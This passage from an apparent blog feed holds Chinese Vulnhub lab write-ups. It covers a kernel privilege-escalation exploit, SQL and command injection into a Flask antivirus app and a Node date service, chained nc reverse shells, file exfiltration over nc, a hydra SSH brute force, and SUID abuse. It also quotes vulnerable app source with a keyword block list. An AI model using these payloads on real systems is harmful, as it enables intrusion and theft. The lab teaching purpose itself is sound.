<p>Linux提权一般优先考虑内核漏洞进行提权。从ssh连接可以看出靶机的系统为 Ubuntu 并且版本为 3.13.0，当且的版本因该是5.x。这里差了两个大更新，因此大概率存在着漏洞。用msf搜索。 <code>searchsploit linux kernel 3.13</code> 可以看到搜索出很多，真实场景的话需要一个一个尝试，这里就挑选一个 37292.c</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203630.png" /></p>
<p>复制exp到当前目录 <code>cp /usr/share/exploitdb/exploits/linux/local/37292.c .</code></p>
<p>这是c编写的，需要用 gcc 编译，但是目标主机可能没有 gcc，所以需要在kali上编译完在传到靶机。因为它是C语言写的，所以查看一下内容是否还有编译的</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203936.png" /></p>
<p>注意到，代码中还调用system，然后利用 gcc 进行编译，因此要进行修改。把相关的代码删除，然后进行编译。（删掉部分从图中第二行开始到if语句结束）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 37292.c -o a</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327205736.png" /></p>
<p>将 <code>ofs-lib.so</code> 文件也复制到相同目录，一起传到目标主机。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate ofs-lib.so</span><br><span class="line"></span><br><span class="line">如果提示：var/lib/mlocate/mlocate.db: 没有那个文件或目录。说明数据库太久没更新了，利用 updtedb 更新一下在搜索即可、</span><br><span class="line"></span><br><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211113.png" /></p>
<p>然后开启http服务，目标主机下载这两个文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211453.png" /></p>
<blockquote>
<p>为了更好的利用exp，建议将这两个文件移到 <code>tmp</code> 目录，因为这个目录的权限一般比较多</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv * /tmp</span><br></pre></td></tr></table></figure>
<p>执行exp拿到root权限。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. cd /tmp</span><br><span class="line">2. chmod +x a</span><br><span class="line">3. ./a</span><br><span class="line">4. id</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211724.png" /></p>
<p>到此为止，整个靶机的攻击过程都结束了。</p>
<h1 id="总结">总结</h1>
<p>完整的渗透过程主要有三个部分：</p>
<ol type="1">
<li>利用Web漏洞，拿到webshell，然后再拿到低权限shell；</li>
<li>权限提升，收集内网信息，确认存活主机。信息收集的越多，发现的可利用漏洞越多，第三步越容易成功；</li>
<li>依次拿到权限，最终拿到目标主机的root权限（比如域控）；</li>
</ol>
<p>本周的靶机里面给我的最大启示如下：</p>
<ol type="1">
<li>找到漏洞exp的时候不要着急的利用，先查看一下代码，代码中所利用的命令可能目标主机上并没有，所以需要在我们自己的主机上准备就绪后再传到目标主机。</li>
<li><code>/tmp</code> 权限比较多</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>第2周：Vulnhub cloudantivirus writeup</title>
    <url>/2022/03/29/%E7%AC%AC2%E5%91%A8%EF%BC%9AVulnhub%20cloudantivirus%20writeup/</url>
    <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第2周，该靶机难度简单。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</p>
<p>难度：Easy</p>
<p>虚拟机软件：Virtual Box</p>
<h1 id="网卡配置">网卡配置</h1>
<p>查看 <strong>第一周</strong> 的信息。 攻击主机 kali：<code>192.168.137.104</code></p>
<h1 id="渗透">渗透</h1>
<h2 id="主机发现">主机发现</h2>
<p>可以像第一周一样使用 <code>sudo arp-scan -l</code>，也可以使用 <code>arping</code> 。后者速度慢，效率低，但是有一个好处就是后者是一个<strong>网络工具</strong>，而前者是一个<strong>黑客工具</strong>，这就意味着大部分Linux都会装前者，而只有kali这种的才会装后者。因此，在内网渗透的时候目标主机可能没有前者，这时候就能使用后者了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 254);do sudo arping -c 2 192.168.137.$i;done</span><br></pre></td></tr></table></figure>
<p>与 ping 类似，一次只能扫描一个IP。<code>-c</code> 后面的参数指的是每个IP的发包次数。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204936.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204715.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204836.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204826.png" /></p>
<p><code>192.168.137.100</code> 是主机在这个网段的IP；<code>192.168.137.1</code> 是网关；<code>192.168.137.104</code> 是kali IP；那么<code>192.168.137.103</code> 就是目标靶机了。</p>
<p>从扫描结果也可以看出这个工具并不会将本机主机当作存活主机！</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205256.png" /></p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205415.png" /></p>
<ol type="1">
<li>22端口上的服务是 openssh</li>
<li>靶机系统为 Ubuntu</li>
<li>8080端口的服务是 http，信息与第1周一样</li>
<li>靶机上存在着 python2 环境</li>
</ol>
<h2 id="访问-http-服务">访问 http 服务</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211057.png" /></p>
<p>接下来，当然要进行<strong>目录扫描</strong>，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211439.png" /></p>
<p>有一个 <code>/console</code>，打开如下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211506.png" /></p>
<p>这边暂时没有头绪，先放着，去测试一下网页的功能点。</p>
<p>接下来要用 burp 抓包，所以先设置一下代理，将浏览器的代理设置为如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211629.png" /></p>
<p>端口其实可以设置为其他的，只要和 burp 中的保持一致即可。</p>
<p>发现需要输入验证码，这里可能存在注入点，<strong>先用burp fuzz 一下键盘上的特殊字符</strong>。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212320.png" /></p>
<p>发现当输入双引号的时候出现了不一样的提示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212405.png" /></p>
<p>从这报错信息中可以看到：</p>
<ol type="1">
<li>路径信息</li>
<li>模板为 flask</li>
<li>存在 sql 注入语句，闭合方式为双引号</li>
</ol>
<h2 id="sql-注入">sql 注入</h2>
<p>根据 sql 查询语句构造如下 payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or 1=1-- </span><br><span class="line">最后面有一个空格！！！</span><br></pre></td></tr></table></figure></p>
<p>成功进入！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212626.png" /></p>
<p>观察这些文件，发现这跟在命令行执行 <code>ls -l</code> 返回的结果很像。并且这是一个云反病毒的程序，因此我们输入文件名之后，后台肯定执行了某条命令，假设为 <code>cloudav filename</code> 。我们知道 Linux 系统中可以一次性执行多条命令，方式有很多，可以通过 <code>|</code>, <code>||</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>;</code> 等符号的帮忙做到，这里选用管道符，输入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|id</span><br></pre></td></tr></table></figure></p>
<p>发现确实可以执行，因此，接下来就可以考虑弹shell了。</p>
<h2 id="反弹-shell">反弹 shell</h2>
<p>第一周中使用的是 python 反弹，这里的环境与第一周一样，也是可以用 python 的。但是由于现在属于学习阶段，因此就使用不同的办法，这里使用 <code>nc</code>。</p>
<p>在kali上启动监听： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>王爷输入命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 4444 -e /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>这里发现kali并没有。这是因为， <code>-e</code> 这个参数不是所有的 <code>nc</code> 版本都有，可以使用 <code>which nc</code> 查看对方主机是否有 <code>nc</code> ，如果有的话则说明，不存在 <code>-e</code> 操作。这里执行 <code>hello|which nc</code> 弹出信息 <code>/bin/nc</code> 说明对方主机存在 <code>nc</code> 但是没有参数 <code>-e</code>。</p>
<p>此时可以使用 <strong>nc串联</strong>！！！操作如下：</p>
<p>第一步，kali 开两个命令行窗口分别监听： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 3333</span><br><span class="line">2. nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>第二步，网页输入命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 3333|/bin/sh|nc 192.168.137.104 4444</span><br></pre></td></tr></table></figure></p>
<p>解释一下这个意思：</p>
<blockquote>
<p>首先得知道管道符的作用。举个例子，<code>cmd1|cmd2</code>，在这里cmd1执行完之后将结果作为参数传入cmd2（至于cmd2用不用就是得看cmd2本身需不需传参）。现在来解释一下那句命令，假设kali输入命令 <code>ls</code>，然后通过3333端口到达靶机，靶机通过<code>nc 192.168.137.104 3333</code>接收到后将命令通过管道符传给 <code>/bin/sh</code>，shell执行完命令<code>ls</code>后，将结果通过<code>nc 192.168.137.104 4444</code>传入到kali，kali监听4444端口，得到<code>ls</code>执行的结果。</p>
</blockquote>
<p>结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329215902.png" /></p>
<p>查看 id 发现是 scanner，不是 root。因此，接下来就需要提权。</p>
<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
<p>第一周用的是<strong>内核漏洞提权</strong>，本周换一个办法。</p>
<p>现在靶机上进行信息收集，看到了 <code>templates</code>，根据之前收集到的信息，这应该是 <code>flask</code> 搭建的模板文件。对我们的提权没有作用，注意到有一个 <code>.sql</code> 文件，这是数据库的文件，查看一下是否有账号和密码这些隐私。</p>
<p>利用 <code>file database.sql</code> 发现打不开，后来发现是因为靶机上没有 <code>sqlite</code>，至于为什么是 sqlite，这是因为 sql 注入的报错信息提示的。那么就将这个文件发到kali上打开。</p>
<p>kali打开监听器： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; db.sql</span><br></pre></td></tr></table></figure></p>
<p>靶机输入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.137.104 5555 &lt; dabase.sql</span><br></pre></td></tr></table></figure></p>
<p>一段时间（保证文件传输完毕）后手动断开连接，接着打开该文件： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sqlite3</span><br><span class="line">2. .open db.sql</span><br><span class="line">3. .database</span><br><span class="line">4. .dump</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329221819.png" /></p>
<p>此时获得了密码，接下来可以尝试一下获取和 shell 有关的账号，然后与这些密码组合进行爆破攻击。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>发现有三个账号。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222213.png" /></p>
<p>接下来将用户名保存为一个文件，密码为另一个文件，然后使用 <code>hydra</code> 爆破 ssh。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p passwd.txt ssh://192.168.137.103</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222931.png" /></p>
<p>发现爆破没有成功的。这件事告诉我们，有时候自认为很有用的密码，并没有什么用。错误没什么可怕的，可怕的是不敢尝试！</p>
<p>一个小秘密，上面搜集的密码可以用来登录之前 sql 注入的地方。</p>
<p>接下来想想还有什么办法可以提权？对了，<strong><code>SUID</code> 提权</strong>也是Linux本地提权常用的一种办法。</p>
<blockquote>
<p>某个程序如果具有 suid 的权限，那么这台主机上的任何用户执行该程序都将默认继承该程序属主的权限。如果属主是root，那么该程序就是用root权限执行的，那么就可以想办法利用该程序去获得shell。</p>
</blockquote>
<p>发现该目录下并没有suid权限的程序，往上一个目录查找，发现！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329223319.png" /></p>
<p>注意中间那个程序最前面有一个 <code>s</code>。这就是 suid 权限的标志！！！然后注意到下面还有一个.c文件，这应该就是源码了，查看源码： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *freshclam=<span class="string">&quot;/usr/bin/freshclam&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(freshclam) + <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, freshclam, argv[<span class="number">1</span>]);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(command);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>解释一下该源码，从<code>argv[1]</code>看出该程序接收一个参数，并且这个参数和 <code>freshclam</code> 构成一个<code>command</code>，然后 <code>system(command)</code> 执行 命令。因此，我们能够控制的就是 <code>argv[1]</code> 这个参数。</p>
<p>kali再开两个命令行窗口，然后分别执行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 5555</span><br><span class="line">2. nc -lvnp 6666</span><br></pre></td></tr></table></figure></p>
<p>靶机执行如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./update_cloudav &quot;a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666&quot;</span><br></pre></td></tr></table></figure></p>
<p>注意，（<strong>一定要在最前面加上|,就算没有a，也要有|</strong>）这样构成的命令就是这样： <code>/usr/bin/freshclam a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>，这是一个完整的命令，是可以被执行的。</p>
<p>如果前面没有|，则构成<code>/usr/bin/freshclam nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>，会先执行 <code>/usr/bin/freshclam nc 192.168.137.104 5555</code>，这样子nc串联就断开了，无法获得shell。</p>
<p>最终成功获得 root 权限！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329225809.png" /></p>
<h1 id="总结">总结</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328131235.png" /></p>
<p>通过对该虚拟机的渗透，学到了：</p>
<ol type="1">
<li><code>arping</code> 进行主机发现</li>
<li>nc串联反弹shell</li>
<li>suid提权</li>
</ol>
<p>疑点：访问 http 服务那有一个地方需要输入 pin 码，还没找到</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>第3周：Vulnhub chronos writeup</title>
    <url>/2022/04/01/%E7%AC%AC3%E5%91%A8%EF%BC%9AVulnhub%20chronos%20writeup/</url>
    <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第3周，该靶机难度简单。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
<p>难度：Easy</p>
<p>虚拟机软件：Virtual Box</p>
<p>目标：取得2个flag，获得root权限</p>
<p>涉及的攻击方法：</p>
<ul>
<li>端口扫描</li>
<li>web侦察</li>
<li>命令注入</li>
<li>数据编、解码</li>
<li><strong>搜索大法</strong></li>
<li><strong>框架漏洞利用</strong></li>
<li>代码审计</li>
<li>NC串联</li>
<li>本地提权</li>
</ul>
<h1 id="网卡配置">网卡配置</h1>
<p>查看 <strong>第一周</strong> 的信息。</p>
<p>攻击主机 kali：<code>192.168.137.104</code></p>
<h1 id="渗透">渗透</h1>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">如果实际的子网掩码是24位，那么上面查询的时候就减8，也就是16。实际查询的子网掩码位数设置为实际的子网掩码位数减8效果最好。</span><br></pre></td></tr></table></figure>
<p>原理：与前面的两者相同，都是通过ARP解析</p>
<p>结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
<p>因此，靶机的IP为 192.168.137.105</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
<p>信息：</p>
<ol type="1">
<li>22端口上的服务为openssh</li>
<li>80端口上的服务为http，版本为 2.4.29</li>
<li>8000端口上的服务也是http，但是用的 <code>node.js express framework</code></li>
<li>系统为Ubuntu</li>
</ol>
<h2 id="访问http服务">访问http服务</h2>
<p>有三件事必须做：</p>
<ol type="1">
<li>抓包</li>
<li>看源码</li>
<li>扫目录</li>
</ol>
<p>发现80端口和8000端口很类似（一个朴素，一个华丽），源码是一样的，其中有一串特殊的字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
<p>乍一看，好像是加密的js代码。这里推荐一个网址，可以对代码进行美化和编码解码：https://gchq.github.io/CyberChef/</p>
<p>利用<code>javascript beautify</code>模块美化之后虽然看的很清楚了，但是因为各种参数都加密了还是无法直到这段代码的意思。但是其中有一串字符没有加密： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
<p>最后，抓包看一下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
<p>发现确实有数据包往 chronos.local:8000 地方发送，但是我们无法用浏览器直接访问，因为kali并不知道chronos.local是哪台主机，但是我们知道，这应该就是靶机。因此，修改<code>/etc/hosts</code>，添加一条记录：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
<p>然后可以访问了，并且页面发生了变化。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
<p>结合url分析，发现url中的那一串字符像是警告base64编码的，因此，再次利用刚刚的网址进行解码。利用 <code>magic</code> 模块进行解码，发现是base58编码。得到解码后的结果：<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
<blockquote>
<p>base系列有许多，但是常见的是base64和base32。还有许多不常见的，比如这里的base58。</p>
</blockquote>
<ol type="1">
<li>date</li>
<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
<li>页面上显示的时间信息</li>
</ol>
<p>这让我想到Linux中的date命令，也是能够显示时间，因此在kali上尝试一下如下代码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
<p>发现结果和页面显示的一模一样（未经过渲染）。因此，有理由怀疑后台服务调用了系统命令，并且后台代码可能如下（猜测，并不是真正的代码，只是说明代码逻辑）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
<p>如果我们什么都不修改，那么执行的命令就是<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>，因此，我们可以考虑到Linux中以下执行多条命令（上周使用的是管道符，这周使用 <code>$$</code>，该符号只有在前面的命令正确执行的情况下，才会执行后面的命令）</p>
<p>先做一个尝试， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
<p>成功执行，因此这里确实调用了系统命令。接下来使用nc串联来反弹shell（先判断是否有nc，然后再判断是否有 -e）</p>
<h2 id="反弹shell">反弹shell</h2>
<p>首先在kali上启动两个监听端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>然后将payload base58编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
<p>虽然提示出错，但是kali已经成功连接上了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
<p>接下来进行信息收集：</p>
<p>发现在 <code>/home/imera</code> 目录下有一个<code>user.txt</code>文件，但是却没有权限读取，这应该就是其中一个flag了。并且在<code>/root</code>目录下也有一个flag，这应该是第二个flag，不出意料也没有权限读取。</p>
<p>还可以看一下 <code>app.js</code> <code>package.jsom</code> 和 <code>package-lock.json</code> 的内容，其中第一个的源码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.send(<span 